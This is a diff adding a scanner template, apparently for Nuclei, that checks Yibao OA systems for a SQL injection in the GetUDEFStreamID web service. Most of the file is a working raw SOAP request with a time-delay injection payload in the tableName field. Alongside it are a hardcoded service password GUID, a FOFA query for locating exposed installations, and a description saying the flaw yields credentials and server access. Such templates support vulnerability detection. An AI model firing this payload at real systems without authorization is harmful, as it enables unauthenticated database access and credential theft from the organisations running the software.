@@ -1,0 +1,45 @@
+id: yibao-getudefstreamid-sqli
+
+info:
+  name: Yibao OA GetUDEFStreamID - SQL Injection
+  author: qwtd
+  severity: high
+  description: 易宝OA GetUDEFStreamID接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%98%93%E5%AE%9DOA/%E6%98%93%E5%AE%9DOA-GetUDEFStreamID%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="顶讯科技-易宝OA系统"
+  tags: 易宝OA
+
+http:
+  - raw:
+      - |
+        POST /WebService/BasicService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 85
+        SOAPAction: "http://tempuri.org/GetUDEFStreamID"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetUDEFStreamID xmlns="http://tempuri.org/">
+              <tableName>';WAITFOR DELAY '0:0:5'--</tableName>
+              <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
+            </GetUDEFStreamID>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'GetUDEFStreamIDResponse'
+      - type: dsl
+        dsl:
+          - "duration>=5"
